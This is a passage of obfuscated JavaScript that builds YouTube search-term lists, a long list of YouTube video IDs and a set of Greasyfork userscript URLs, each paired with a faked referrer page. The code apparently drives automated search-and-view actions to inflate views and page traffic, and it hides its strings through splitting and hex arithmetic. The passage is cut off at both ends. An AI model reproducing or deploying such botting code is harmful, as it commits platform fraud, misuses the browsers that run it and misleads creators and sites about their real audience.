searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + V(0x5) + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + W(0x10) + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x818 + -0xf14 + 0x2 * 0x383)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xfdf + -0xfd5 + 0x1fbe)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + V(0x3) + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x161c + 0x1240 + -0x2859);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    W(0x2) + 'E',
    'GfvShU6Sy9' + 'A',
    V(0x8) + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    V(0x0) + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    W(0x11) + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': W(0x4) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
